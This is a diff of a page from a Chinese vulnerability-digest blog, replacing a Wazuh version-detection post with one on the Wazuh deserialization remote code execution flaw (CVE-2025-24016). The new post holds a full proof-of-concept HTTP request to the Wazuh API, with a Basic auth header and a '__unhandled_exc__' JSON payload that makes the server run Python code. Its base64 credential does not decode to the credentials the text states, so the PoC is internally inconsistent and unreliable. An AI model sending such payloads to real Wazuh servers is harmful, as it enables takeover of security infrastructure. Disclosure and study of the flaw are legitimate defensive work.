@@ -19,23 +19,23 @@
   <meta name="author" content="lianccc">
   <meta name="keywords" content="">
   
-    <meta name="description" content="漏洞信息漏洞名称： Wazuh Web Interface 版本检测漏洞 漏洞编号：  CVE： CVE-2024-57378  漏洞类型： 信息泄露 漏洞等级： 中危 漏洞描述： 该漏洞涉及Wazuh Web Interface的版本检测问题，通过特定的Nuclei HTTP模板可以检测目标URL（及其&#x2F;app&#x2F;login页面）是否为Wazuh web界面，提取wazuhVe">
+    <meta name="description" content="漏洞信息漏洞名称： Wazuh 反序列化远程代码执行漏洞 漏洞编号：  CVE： CVE-2025-24016  漏洞类型： 反序列化 漏洞等级： 严重 漏洞描述： Wazuh是一个免费开源的威胁预防、检测和响应平台。从版本4.4.0开始到4.9.1之前，存在一个不安全的反序列化漏洞，允许在Wazuh服务器上执行远程代码。DistributedAPI参数被序列化为JSON并使用as_wazuh_o">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Wazuh Web Interface 版本检测漏洞">
-<meta property="og:url" content="http://example.com/2025/06/10/github_1583484575/index.html">
+<meta property="og:title" content="Wazuh 反序列化远程代码执行漏洞">
+<meta property="og:url" content="http://example.com/2025/06/10/github_2878933385/index.html">
 <meta property="og:site_name" content="liancc&#39; infos blog">
-<meta property="og:description" content="漏洞信息漏洞名称： Wazuh Web Interface 版本检测漏洞 漏洞编号：  CVE： CVE-2024-57378  漏洞类型： 信息泄露 漏洞等级： 中危 漏洞描述： 该漏洞涉及Wazuh Web Interface的版本检测问题，通过特定的Nuclei HTTP模板可以检测目标URL（及其&#x2F;app&#x2F;login页面）是否为Wazuh web界面，提取wazuhVe">
+<meta property="og:description" content="漏洞信息漏洞名称： Wazuh 反序列化远程代码执行漏洞 漏洞编号：  CVE： CVE-2025-24016  漏洞类型： 反序列化 漏洞等级： 严重 漏洞描述： Wazuh是一个免费开源的威胁预防、检测和响应平台。从版本4.4.0开始到4.9.1之前，存在一个不安全的反序列化漏洞，允许在Wazuh服务器上执行远程代码。DistributedAPI参数被序列化为JSON并使用as_wazuh_o">
 <meta property="og:locale" content="zh_CN">
-<meta property="article:published_time" content="2025-06-10T21:00:29.720Z">
-<meta property="article:modified_time" content="2025-06-10T21:00:29.719Z">
+<meta property="article:published_time" content="2025-06-10T21:45:19.849Z">
+<meta property="article:modified_time" content="2025-06-10T21:45:19.850Z">
 <meta property="article:author" content="lianccc">
-<meta property="article:tag" content="信息泄露">
-<meta property="article:tag" content="CVE-2024:github search">
+<meta property="article:tag" content="CVE-2025:github search">
+<meta property="article:tag" content="反序列化">
 <meta name="twitter:card" content="summary_large_image">
   
   
   
-  <title>Wazuh Web Interface 版本检测漏洞 - liancc&#39; infos blog</title>
+  <title>Wazuh 反序列化远程代码执行漏洞 - liancc&#39; infos blog</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -202,7 +202,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="Wazuh Web Interface 版本检测漏洞"></span>
+            <span id="subtitle" data-typed-text="Wazuh 反序列化远程代码执行漏洞"></span>
           
         </div>
 
@@ -213,7 +213,7 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2025-06-10 21:00" pubdate>
+        <time datetime="2025-06-10 21:45" pubdate>
           2025年6月10日 晚上
         </time>
       </span>
@@ -225,7 +225,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          207 字
+          453 字
         
       </span>
     
@@ -236,7 +236,7 @@
         
         
         
-          2 分钟
+          4 分钟
         
       </span>
     
@@ -273,39 +273,43 @@
       <div class="container nopadding-x-md" id="board-ctn">
         <div id="board">
           <article class="post-content mx-auto">
-            <h1 id="seo-header">Wazuh Web Interface 版本检测漏洞</h1>
+            <h1 id="seo-header">Wazuh 反序列化远程代码执行漏洞</h1>
             
             
               <div class="markdown-body">
                 
-                <h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> Wazuh Web Interface 版本检测漏洞</p>
+                <h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> Wazuh 反序列化远程代码执行漏洞</p>
 <p><strong>漏洞编号：</strong></p>
 <ul>
-<li><strong>CVE：</strong> CVE-2024-57378</li>
+<li><strong>CVE：</strong> CVE-2025-24016</li>
 </ul>
-<p><strong>漏洞类型：</strong> 信息泄露</p>
-<p><strong>漏洞等级：</strong> 中危</p>
-<p><strong>漏洞描述：</strong> 该漏洞涉及Wazuh Web Interface的版本检测问题，通过特定的Nuclei HTTP模板可以检测目标URL（及其&#x2F;app&#x2F;login页面）是否为Wazuh web界面，提取wazuhVersion值，并确认页面可访问（200状态）且确实是Wazuh UI（通过标题和关键词匹配）。如果提取的版本为4.8.2，Nuclei会报告匹配。</p>
+<p><strong>漏洞类型：</strong> 反序列化</p>
+<p><strong>漏洞等级：</strong> 严重</p>
+<p><strong>漏洞描述：</strong> Wazuh是一个免费开源的威胁预防、检测和响应平台。从版本4.4.0开始到4.9.1之前，存在一个不安全的反序列化漏洞，允许在Wazuh服务器上执行远程代码。DistributedAPI参数被序列化为JSON并使用<code>as_wazuh_object</code>（位于<code>framework/wazuh/core/cluster/common.py</code>中）进行反序列化。如果攻击者能够在DAPI请求&#x2F;响应中注入未经过滤的字典，他们可以伪造一个未处理的异常（<code>__unhandled_exc__</code>）来评估任意Python代码。任何具有API访问权限的人（被入侵的仪表板或集群中的Wazuh服务器）或在某些配置下甚至是被入侵的代理都可以触发此漏洞。版本4.9.1包含修复。</p>
 <p><strong>产品厂商：</strong> Wazuh</p>
-<p><strong>产品名称：</strong> Wazuh Web Interface</p>
-<p><strong>影响版本：</strong> 4.8.2</p>
-<p><strong>来源：</strong> <a target="_blank" rel="noopener" href="https://github.com/rxerium/CVE-2024-57378">https://github.com/rxerium/CVE-2024-57378</a></p>
-<p><strong>类型：</strong> CVE-2024:github search</p>
+<p><strong>产品名称：</strong> Wazuh</p>
+<p><strong>影响版本：</strong> 4.4.0 &lt;&#x3D; version &lt; 4.9.1</p>
+<p><strong>来源：</strong> <a target="_blank" rel="noopener" href="https://github.com/B1ack4sh/Blackash-CVE-2025-24016">https://github.com/B1ack4sh/Blackash-CVE-2025-24016</a></p>
+<p><strong>类型：</strong> CVE-2025:github search</p>
 <h1 id="仓库文件"><a href="#仓库文件" class="headerlink" title="仓库文件"></a>仓库文件</h1><ul>
-<li>CVE-2024-57378.yaml</li>
 <li>README.md</li>
 </ul>
-<h1 id="来源概述"><a href="#来源概述" class="headerlink" title="来源概述"></a>来源概述</h1><h2 id="CVE-2024-57378"><a href="#CVE-2024-57378" class="headerlink" title="CVE-2024-57378"></a>CVE-2024-57378</h2><h2 id="How-does-this-detection-method-work"><a href="#How-does-this-detection-method-work" class="headerlink" title="How does this detection method work?"></a>How does this detection method work?</h2><p>This Nuclei HTTP template checks a target URL (and its &#x2F;app&#x2F;login page) for the Wazuh web interface, extracts the wazuhVersion value with a regex, and confirms the page is accessible (200 status) and actually a Wazuh UI (via title and keyword match). If the extracted version is 4.8.2, Nuclei reports a match</p>
-<h2 id="How-do-I-run-this-script"><a href="#How-do-I-run-this-script" class="headerlink" title="How do I run this script?"></a>How do I run this script?</h2><ol>
-<li>Download Nuclei from <a target="_blank" rel="noopener" href="https://github.com/projectdiscovery/nuclei">here</a></li>
-<li>Copy the template to your local system</li>
-<li>Run the following command: <code>nuclei -u https://yourHost.com -t template.yaml</code></li>
+<h1 id="来源概述"><a href="#来源概述" class="headerlink" title="来源概述"></a>来源概述</h1><h2 id="CVE-2025-24016-Wazuh-Remote-Code-Execution-RCE-PoC-🚨"><a href="#CVE-2025-24016-Wazuh-Remote-Code-Execution-RCE-PoC-🚨" class="headerlink" title="CVE-2025-24016 Wazuh Remote Code Execution (RCE) - PoC 🚨"></a>CVE-2025-24016 Wazuh Remote Code Execution (RCE) - PoC 🚨</h2><h2 id="Description"><a href="#Description" class="headerlink" title="Description:"></a>Description:</h2><p>Wazuh is a free and open source platform used for threat prevention, detection, and response. Starting in version 4.4.0 and prior to version 4.9.1, an unsafe deserialization vulnerability allows for remote code execution on Wazuh servers. DistributedAPI parameters are a serialized as JSON and deserialized using <code>as_wazuh_object</code> (in <code>framework/wazuh/core/cluster/common.py</code>). If an attacker manages to inject an unsanitized dictionary in DAPI request&#x2F;response, they can forge an unhandled exception (<code>__unhandled_exc__</code>) to evaluate arbitrary python code. The vulnerability can be triggered by anybody with API access (compromised dashboard or Wazuh servers in the cluster) or, in certain configurations, even by a compromised agent. Version 4.9.1 contains a fix.</p>
+<h2 id="Metrics"><a href="#Metrics" class="headerlink" title="Metrics:"></a>Metrics:</h2><p>CNA:  <code>GitHub</code>, Inc. Base Score: 9.9 CRITICAL Vector:  CVSS:3.1&#x2F;AV:N&#x2F;AC:L&#x2F;PR:L&#x2F;UI:N&#x2F;S:C&#x2F;C:L&#x2F;I:H&#x2F;A:H</p>
+<h2 id="Proof-of-Concept"><a href="#Proof-of-Concept" class="headerlink" title="Proof of Concept:"></a>Proof of Concept:</h2><p>To trigger this vulnerability using the server API, follow the steps below.</p>
+<h2 id="PoC-Burp-Suite-Request"><a href="#PoC-Burp-Suite-Request" class="headerlink" title="PoC Burp Suite Request:"></a>PoC Burp Suite Request:</h2><ol>
+<li>Burp Suite Request to Trigger the Vulnerability:</li>
 </ol>
-<h3 id="References"><a href="#References" class="headerlink" title="References"></a>References</h3><ul>
-<li><a target="_blank" rel="noopener" href="https://nvd.nist.gov/vuln/detail/CVE-2024-57378">https://nvd.nist.gov/vuln/detail/CVE-2024-57378</a></li>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/security/user/authenticate/run_as</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>target.com:55000<br><span class="hljs-attribute">Cache-Control</span><span class="hljs-punctuation">: </span>max-age=0<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>en-US<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.183 Safari/537.36<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>application/json<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate, br<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>keep-alive<br><span class="hljs-attribute">Authorization</span><span class="hljs-punctuation">: </span>Basic d2F6dXcta3dpTUltUzNjcjM3UDA1MHItOg==  # Base64-encoded &quot;wazuh-wui:MyS3cr37P450r.*-&quot;<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/json<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>83<br><br><span class="language-prolog">&#123;</span><br><span class="language-prolog">  <span class="hljs-string">&quot;__unhandled_exc__&quot;</span>: &#123;</span><br><span class="language-prolog">    <span class="hljs-string">&quot;__class__&quot;</span>: <span class="hljs-string">&quot;exit&quot;</span>,</span><br><span class="language-prolog">    <span class="hljs-string">&quot;__args__&quot;</span>: []</span><br><span class="language-prolog">  &#125;</span><br><span class="language-prolog">&#125;</span><br></code></pre></td></tr></table></figure>
+
+<ol start="2">
+<li>Explanation of Request:</li>
+</ol>
+<ul>
+<li>Authorization Header: This is the base64-encoded authorization (<code>wazuh-wui:MyS3cr37P450r.*-</code>).</li>
+<li>Payload: The malicious payload contains the unsanitized exception <code>__unhandled_exc__</code> which triggers the execution of arbitrary Python code (<code>exit</code> in this case).</li>
 </ul>
-<h3 id="Disclaimer"><a href="#Disclaimer" class="headerlink" title="Disclaimer"></a>Disclaimer</h3><p>Use at your own risk, I will not be responsible for illegal activities you conduct on infrastructure you do not own or have permission to scan.</p>
-<h3 id="Contact"><a href="#Contact" class="headerlink" title="Contact"></a>Contact</h3><p>Feel free to reach out to me on <a target="_blank" rel="noopener" href="https://signal.me/#eu/0Qd68U1ivXNdWCF4hf70UYFo7tB0w-GQqFpYcyV6-yr4exn2SclB6bFeP7wTAxQw">Signal</a>.</p>
+<h2 id="Disclaimer-⚠️"><a href="#Disclaimer-⚠️" class="headerlink" title="Disclaimer ⚠️"></a>Disclaimer ⚠️</h2><p>For educational and research purposes only. Use only against systems you own or have permission to test.</p>
 
                 
               </div>
@@ -339,9 +343,9 @@
     <div class="post-meta">
       <i class="iconfont icon-tags"></i>
       
-        <a href="/tags/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/" class="print-no-link">#信息泄露</a>
+        <a href="/tags/CVE-2025-github-search/" class="print-no-link">#CVE-2025:github search</a>
       
-        <a href="/tags/CVE-2024-github-search/" class="print-no-link">#CVE-2024:github search</a>
+        <a href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" class="print-no-link">#反序列化</a>
       
     </div>
   
@@ -353,8 +357,8 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>Wazuh Web Interface 版本检测漏洞</div>
-      <div>http://example.com/2025/06/10/github_1583484575/</div>
+      <div>Wazuh 反序列化远程代码执行漏洞</div>
+      <div>http://example.com/2025/06/10/github_2878933385/</div>
     </div>
     <div class="license-meta">
       
@@ -398,18 +402,12 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2025/06/10/github_2878933385/" title="Wazuh 反序列化远程代码执行漏洞">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">Wazuh 反序列化远程代码执行漏洞</span>
-                        <span class="visible-mobile">上一篇</span>
-                      </a>
-                    
                   </article>
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2025/06/10/github_2256219304/" title="Quest KACE SMA /common/run_cross_report.php &#39;fmt&#39; XSS">
-                        <span class="hidden-mobile">Quest KACE SMA /common/run_cross_report.php &#39;fmt&#39; XSS</span>
+                      <a href="/2025/06/10/github_1583484575/" title="Wazuh Web Interface 版本检测漏洞">
+                        <span class="hidden-mobile">Wazuh Web Interface 版本检测漏洞</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
